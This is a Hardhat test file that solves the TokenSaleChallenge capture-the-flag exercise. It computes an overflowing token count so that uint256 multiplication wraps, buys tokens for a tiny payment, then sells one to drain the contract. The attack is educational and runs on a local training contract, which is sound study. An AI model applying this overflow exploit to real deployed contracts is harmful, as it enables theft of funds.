import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * YOUR CODE HERE
     * */
    // The buy function here is vulnerable for overflow attack
    // Suppose we pass a large numTokens value, like 2**256 + 1
    // This would overflow numTokens * PRICE_PER_TOKEN to a low value due to the limited range of uint256.

    // Calculate the overflowed numTokens value
    const PRICE_PER_TOKEN = ethers.utils.parseEther('1');

    // Overflow: 2**256 + 1
    // 2**256 / 10**18 + 1 = 115792089237316195423570985008687907853269984665640564039458
    const overflowedNumTokens = BigNumber.from(2).pow(256).div(PRICE_PER_TOKEN).add(1);
    console.log('overflowedNumTokens:', overflowedNumTokens.toString());

    // What is msg.value in this case? How does it wrap around?
    // We know overflowedNumTokens = 2**256 / 10**18 + 1 = 115792089237316195423570985008687907853269984665640564039458
    // (2**256 / 10**18 + 1) * 10**18 - 2**256 = 415992086870360064
    // Use modulus operation (.mod)
    const amountInWei = overflowedNumTokens.mul(PRICE_PER_TOKEN).mod(BigNumber.from(2).pow(256));
    console.log('minimalCost:', amountInWei.toString());

    // Buy tokens with the overflowed numTokens and minimal msg.value
    const tx1 = await target.buy(overflowedNumTokens, { value: amountInWei });
    await tx1.wait();

    const tx2 = await target.sell(1);
    await tx2.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
